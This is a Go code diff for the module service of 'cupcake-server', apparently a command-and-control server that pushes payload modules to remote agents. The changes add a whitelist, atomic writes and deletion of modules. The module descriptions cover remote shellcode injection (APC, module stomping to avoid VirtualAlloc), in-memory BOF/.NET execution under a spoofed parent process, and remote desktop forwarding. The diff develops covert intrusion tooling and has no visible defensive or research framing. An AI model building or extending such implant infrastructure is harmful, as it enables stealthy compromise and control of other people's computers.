@@ -4,14 +4,48 @@ import (
 	"crypto/sha256"
 	"encoding/base64"
 	"encoding/binary"
+	"errors"
 	"fmt"
+	"log"
 	"os"
 	"path/filepath"
 	"strings"
 	"sync"
 
+	"github.com/google/uuid"
+
+	"cupcake-server/pkg/paths"
 	"cupcake-server/pkg/utils"
 )
+
+// Product L2 modules (independent packages, separate push).
+var productModuleIDs = map[string]bool{
+	"desktop":  true,
+	"iso_host": true,
+	"inject":   true,
+}
+
+var (
+	// ErrModuleForbidden: non-product id
+	ErrModuleForbidden = errors.New("module forbidden")
+	// ErrModuleNotFound: product id but not registered on disk/memory
+	ErrModuleNotFound = errors.New("module not found")
+)
+
+// IsProductModule reports whether id is one of the three product L2 modules.
+func IsProductModule(id string) bool {
+	return productModuleIDs[sanitizeID(id)]
+}
+
+// NewModuleServiceForTest builds an isolated service (TempDir) — not the process singleton.
+func NewModuleServiceForTest(dir string) *ModuleService {
+	_ = os.MkdirAll(dir, 0o755)
+	return &ModuleService{
+		raw:         make(map[string][]byte),
+		dir:         dir,
+		agentLoaded: make(map[string]map[string]bool),
+	}
+}
 
 // Module package format (must match Client/core/src/module_package.rs + wire_ids)
 // MAGIC | ver(u16le) | flags(u16le) | id_len(u16le) | id | pay_len(u32le) | payload | hmac32
@@ -52,7 +86,7 @@ var moduleOnce sync.Once
 // GetModuleService returns the process-wide module service.
 func GetModuleService() *ModuleService {
 	moduleOnce.Do(func() {
-		dir := filepath.Join("storage", "modules")
+		dir := paths.Join("modules")
 		_ = os.MkdirAll(dir, 0o755)
 		defaultModuleService = &ModuleService{
 			raw:         make(map[string][]byte),
@@ -98,18 +132,33 @@ func (m *ModuleService) activeKey() []byte {
 	return DefaultModuleKey()
 }
 
-// RegisterRaw stores raw module PE bytes in memory and optionally on disk.
+// RegisterRaw stores raw module PE on disk first, then memory (atomic-ish).
+// Product whitelist: desktop | iso_host | inject only.
+// Non-goal: no "policy lock" — any admin may delete any product module.
 func (m *ModuleService) RegisterRaw(id string, pe []byte) error {
+	id = sanitizeID(id)
 	if id == "" || len(pe) == 0 {
 		return fmt.Errorf("invalid module id or empty payload")
 	}
-	m.mu.Lock()
-	defer m.mu.Unlock()
+	if !IsProductModule(id) {
+		return fmt.Errorf("%w: %s (product: desktop, iso_host, inject)", ErrModuleForbidden, id)
+	}
+	_ = os.MkdirAll(m.dir, 0o755)
+	final := filepath.Join(m.dir, id+".bin")
+	tmp := filepath.Join(m.dir, fmt.Sprintf(".%s.%s.tmp", id, uuid.NewString()))
+	if err := os.WriteFile(tmp, pe, 0o644); err != nil {
+		return fmt.Errorf("write module temp: %w", err)
+	}
+	if err := os.Rename(tmp, final); err != nil {
+		_ = os.Remove(tmp)
+		return fmt.Errorf("commit module file: %w", err)
+	}
 	cp := make([]byte, len(pe))
 	copy(cp, pe)
+	m.mu.Lock()
 	m.raw[id] = cp
-	path := filepath.Join(m.dir, sanitizeID(id)+".bin")
-	return os.WriteFile(path, cp, 0o644)
+	m.mu.Unlock()
+	return nil
 }
 
 // LoadFromFile loads a PE/DLL into the registry under id.
@@ -121,18 +170,92 @@ func (m *ModuleService) LoadFromFile(id, path string) error {
 	return m.RegisterRaw(id, b)
 }
 
+// Dir returns the modules storage directory.
+func (m *ModuleService) Dir() string {
+	return m.dir
+}
+
+// Delete removes a module from memory and disk.
+// Returns ErrModuleForbidden / ErrModuleNotFound for controller mapping.
+// Non-goal: no policy-lock state — admins may always delete product modules when present.
+func (m *ModuleService) Delete(id string) error {
+	id = sanitizeID(id)
+	if id == "" {
+		return fmt.Errorf("empty module id")
+	}
+	if !IsProductModule(id) {
+		return fmt.Errorf("%w: %s", ErrModuleForbidden, id)
+	}
+	path := filepath.Join(m.dir, id+".bin")
+	m.mu.Lock()
+	_, inMem := m.raw[id]
+	m.mu.Unlock()
+	_, diskErr := os.Stat(path)
+	onDisk := diskErr == nil
+	if !inMem && !onDisk {
+		// Also check alternate names as "present"
+		alts := altNames(m.dir, id)
+		for _, a := range alts {
+			if _, e := os.Stat(a); e == nil {
+				onDisk = true
+				break
+			}
+		}
+	}
+	if !inMem && !onDisk {
+		return fmt.Errorf("%w: %s", ErrModuleNotFound, id)
+	}
+
+	m.mu.Lock()
+	delete(m.raw, id)
+	for agent, set := range m.agentLoaded {
+		if set != nil {
+			delete(set, id)
+			if len(set) == 0 {
+				delete(m.agentLoaded, agent)
+			}
+		}
+	}
+	m.mu.Unlock()
+
+	if err := os.Remove(path); err != nil && !os.IsNotExist(err) {
+		return err
+	}
+	for _, alt := range altNames(m.dir, id) {
+		_ = os.Remove(alt)
+	}
+	log.Printf("[Module] deleted %s", id)
+	return nil
+}
+
+func altNames(dir, id string) []string {
+	alts := []string{filepath.Join(dir, "cupcake_mod_"+id+".dll")}
+	if id == "iso_host" {
+		alts = append(alts,
+			filepath.Join(dir, "cupcake-iso-host.exe"),
+			filepath.Join(dir, "iso_host.exe"),
+		)
+	}
+	return alts
+}
+
 // resolveRaw returns registered PE bytes for module id (memory then disk).
+// Always enforces product whitelist — legacy bof.bin on disk cannot be packed.
 func (m *ModuleService) resolveRaw(id string) ([]byte, error) {
+	id = sanitizeID(id)
+	if !IsProductModule(id) {
+		return nil, fmt.Errorf("%w: %s", ErrModuleForbidden, id)
+	}
 	m.mu.RLock()
 	pe, ok := m.raw[id]
 	m.mu.RUnlock()
 	if ok && len(pe) > 0 {
 		return pe, nil
 	}
-	path := filepath.Join(m.dir, sanitizeID(id)+".bin")
+	path := filepath.Join(m.dir, id+".bin")
 	b, err := os.ReadFile(path)
 	if err != nil {
-		return nil, fmt.Errorf("module %q not found", id)
+		return nil, fmt.Errorf("%w: %s", ErrModuleNotFound, id)
 	}
 	m.mu.Lock()
 	m.raw[id] = b
@@ -241,35 +364,21 @@ func ModuleDescribe(id string) (name, desc, kind string) {
 
 // ModuleDescribeEx also returns product load_mode: mem | iso | legacy.
 func ModuleDescribeEx(id string) (name, desc, kind, loadMode string) {
-	switch strings.ToLower(strings.TrimSpace(id)) {
-	case "iso_host", "iso-host":
+	switch sanitizeID(id) {
+	case "iso_host":
 		return "隔离执行宿主",
-			"短命 PE（cupcake-iso-host）：PPID 伪装进程内内存执行 BOF/.NET；Agent 本体不跑重能力。",
+			"产品模块③：PPID 伪装短命进程内内存执行 BOF/.NET。载荷在插件库，本模块是宿主。",
 			"host", "iso"
-	case "bof":
-		return "BOF 运行时（旧）",
-			"同进程 COFF 执行 DLL（遗留）。当前推荐走 iso_host 隔离路径。",
-			"legacy", "legacy"
-	case "dotnet":
-		return ".NET 运行时（旧）",
-			"同进程 CLR 宿主 DLL（遗留）。当前推荐走 iso_host 隔离路径。",
-			"legacy", "legacy"
-	case "shell":
-		return "Shell 模块（实验）",
-			"实验性终端模块；同进程 Manual-Map 优先，失败再 LoadLibrary。",
-			"legacy", "mem"
-	case "inject", "mod_inject", "process_inject":
-		return "进程注入模块",
-			"L2 远程 shellcode 注入（不在 Stage0）。method: nt|crt|apc|stomping|auto。" +
-				"stomping=覆写远程模块 .text（无 VirtualAlloc）；auto 不含 stomp。作业后建议 unload inject。",
+	case "inject":
+		return "进程注入",
+			"产品模块②：L2 远程 shellcode 注入（method: nt|crt|apc|stomping|auto）。与 desktop/iso_host 独立推送。",
 			"runtime", "mem"
-	case "desktop", "mod_desktop":
-		return "远程桌面模块",
-			"L2 远程桌面（Yamux 0x0D / CPXD）。须在模块面板显式加载后再开 Desktop 视图（禁止 auto-stage）。" +
-				"Agent 需 feature=desktop 的 full-gui 构建；仅 TCP Yamux；JPEG MVP。",
+	case "desktop":
+		return "远程桌面",
+			"产品模块①：RDP 3389 端口转发。加载后在「远程桌面」页启动转发；Yamux DESKTOP(0x0D)。",
 			"runtime", "mem"
 	default:
-		return id, "自定义模块二进制（CKMS 打包后可下发；Manual-Map 优先）。", "custom", "mem"
+		return id, "非产品模块（已忽略；产品仅 desktop / iso_host / inject）。", "legacy", "mem"
 	}
 }
 
@@ -281,7 +390,7 @@ func (m *ModuleService) ListCatalog(agentUUID string) []ModuleCatalogEntry {
 	var out []ModuleCatalogEntry
 	add := func(id string, size int) {
 		id = sanitizeID(id)
-		if id == "" || seen[id] {
+		if id == "" || seen[id] || !IsProductModule(id) {
 			return
 		}
 		seen[id] = true
@@ -402,27 +511,39 @@ func (m *ModuleService) scanDisk() {
 		if e.IsDir() || !strings.HasSuffix(e.Name(), ".bin") {
 			continue
 		}
-		id := strings.TrimSuffix(e.Name(), ".bin")
+		id := sanitizeID(strings.TrimSuffix(e.Name(), ".bin"))
+		if !IsProductModule(id) {
+			log.Printf("[Module] skip non-product blob on disk: %s (not in whitelist)", e.Name())
+			continue
+		}
 		b, err := os.ReadFile(filepath.Join(m.dir, e.Name()))
 		if err != nil {
 			continue
 		}
 		m.raw[id] = b
 	}
-	// Also pick up well-known runtime DLL names if present
+	// Well-known product module filenames
 	for _, pair := range []struct{ id, name string }{
 		{"iso_host", "cupcake-iso-host.exe"},
 		{"iso_host", "iso_host.exe"},
-		{"bof", "cupcake_mod_bof.dll"},
-		{"dotnet", "cupcake_mod_dotnet.dll"},
-		{"shell", "cupcake_mod_shell.dll"},
+		{"desktop", "cupcake_mod_desktop.dll"},
+		{"inject", "cupcake_mod_inject.dll"},
 	} {
+		if !IsProductModule(pair.id) {
+			continue
+		}
 		if _, ok := m.raw[pair.id]; ok {
 			continue
 		}
 		p := filepath.Join(m.dir, pair.name)
 		if b, err := os.ReadFile(p); err == nil && len(b) > 0 {
 			m.raw[pair.id] = b
+		}
+	}
+	// Drop non-product ids left on disk from older builds (do not delete files here)
+	for id := range m.raw {
+		if !IsProductModule(id) {
+			delete(m.raw, id)
 		}
 	}
 }
